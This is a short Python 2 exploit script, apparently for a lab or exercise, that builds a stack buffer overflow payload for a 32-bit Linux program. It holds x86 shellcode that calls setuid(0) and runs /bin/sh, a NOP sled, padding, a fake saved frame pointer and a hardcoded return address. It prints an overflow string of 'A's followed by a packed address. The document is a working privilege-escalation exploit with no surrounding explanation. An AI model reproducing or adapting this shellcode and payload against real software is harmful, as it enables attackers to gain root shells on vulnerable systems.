ESP_BASE=0xfffe45fc
DIFF=0

def addrToString(addr):
  string = []
  while addr > 0:
    string.append(chr(addr & 0xff))
    addr /= 0x100
  return "".join(string)

shellcode ="\x31\xdb\xb0\x17\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" # setuid(0) and exec /bin/sh

ebp_addr = "aaaa"
jmp_addr = addrToString(ESP_BASE + DIFF*160)

nop_len = 161
length = 208
arg = nop_len*"\x90" + shellcode + (length-nop_len-len(shellcode))*"A" + ebp_addr + jmp_addr

#print arg



print "A"*212 + addrToString(0xffaa1111)
